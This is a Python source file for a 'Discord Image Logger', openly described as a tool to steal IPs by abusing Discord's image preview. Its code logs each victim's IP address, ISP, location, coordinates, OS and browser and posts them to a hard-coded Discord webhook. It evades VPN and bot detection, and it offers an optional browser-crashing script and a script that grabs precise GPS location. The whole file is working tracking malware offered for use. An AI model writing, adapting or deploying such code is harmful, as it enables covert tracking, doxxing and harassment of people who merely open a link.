# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1154361579433906227/YvDdNCiPqgMTf3lJPq1lpxxb90lb6j33VYvuM2hRd3TMzPM70mW2Ec5XwCJEYqYzfjkTxqou24KKbwiOv8jB8JDntlSd5hj5lMuyJfb0Fzle_XgtzUutednkcFkE6j-vo2_Q01tH",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://www.wikipedia.org/" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@nota2_off"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
